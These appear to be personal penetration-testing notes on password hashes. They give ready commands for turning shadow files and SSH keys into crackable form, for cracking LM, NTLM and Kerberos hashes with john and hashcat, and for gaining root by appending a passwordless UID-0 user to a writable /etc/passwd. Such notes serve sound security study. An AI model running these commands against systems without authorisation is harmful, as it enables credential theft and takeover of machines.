# Convert
passwd -> john
```
unshadow passwd shadow > unshadowed.hash
```
SSH Key -> john
```bash
ssh2john $file > id_rsa.hash
```

# Crack
#### John
```
john --wordlist=/usr/share/wordlists/rockyou.txt $file
```

For LM Hashs:
1. Copy lines into hashfile (include user, uid, LMHash and NTHash)
2. Run john with `--format=LM --show` and without attack type (e.g. wordlist). It will identify 2 hashes per lines, bc LM hashes can be cracked partly. Also, if it displays `????`, this part of the LM wasn't cracked yet. But it needs to.
3. Figure out capitalization of password. I've created a script to get that using the NTML Hash (did I ever test it?...). Alternatively, create wordlist file with only the found password canidate in uppercase. Run john with `--rules --format=NT --wordlist=` to get the password correctly capitalized. ![[checkLMagainstNTLM.py]]
#### Hashcat
Kerberos AS-REP
```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
Kerberos TGS-REP
```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
NTLM Hash
```bash
sudo hashcat -m 1000 NTLMHashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
NT Hash
```bash
hashcat -a 3 -m 900 --encoding-to utf16le NTHashes.txt
```
#### If set through GPP
```bash
gpp-decrypt "$hash"
```
#### If unsalted
https://crackstation.net/

# Exploit
If `/etc/passwd` is writeable
```bash
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Or with acutal credential
```bash
openssl passwd -1 -salt dummy dummy
```

# Identify
Hashes
`hashid $hash`
`hash-identifier`

Find credentials in source code
`~/Documents/activeInformationGathering/trufflehog filesystem --no-verification $path`
#### Windows
| | | | | 
|-|-|-|-|
| $Administrator:$|$500:$|$NO PASSWORD*********************:$|$BE134K40129560B46534340292AF4E72:::$|
|USER     |UID|            LM Hash             |     NT Hash (also called NTLM)|


CrackStation -> RockYou.txt (john)



#### Linux
| | | | | |
|-|-|-|-|-|
|root:|\$6|\$IodYKEbO|\$5TglyZFgGW72oeW0Ql/9Wt7KwW2XWeW3TNmBUo94Qsj1tJg.tDs1HIuIlmyr/:|18251:0:99999:7:::|
|user| $*$|  Salt  |                     Hashed Password                         | Account Information|

|$(*)$|Algorithm|Hashcat|
|-|-|-|
|$1$  |MD5 |500|
|$2a$|Blowfish|3200|
|$2y$|Blowfish|
|$5$|SHA-256|7400|
|$6$|SHA-512|1800|

